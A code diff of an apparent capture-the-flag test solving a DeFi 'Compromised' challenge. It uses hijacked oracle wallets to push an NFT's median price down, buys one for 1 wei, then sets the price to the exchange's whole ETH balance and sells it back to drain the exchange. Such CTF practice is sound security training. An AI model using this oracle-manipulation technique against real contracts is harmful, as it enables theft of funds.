@@ -85,17 +85,17 @@ describe('Compromised challenge', function () {
         console.log("price manipulated")
         const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(afterPrice.toString())
-		await this.exchange.connect(attacker).buyOne( { value: 1 });
-        console.log("Bought one")
-		let exchangeBalance = this.exchange.balance;
+		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 1 });
+        console.log("Bought one",boughtNft)
+		let exchangeBalance = await this.exchange.balance();
         console.log("Balance",exchangeBalance)
         console.log(startPrice)
 		for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  9990000000);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  EXCHANGE_INITIAL_ETH_BALANCE);
         }
         const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
 		console.log("Balance")
-		await this.exchange.connect(attacker).sellOne({ value:9990000000});
+		await this.exchange.connect(attacker).sellOne(1);
         console.log("export")
 
     //     const passwords = [
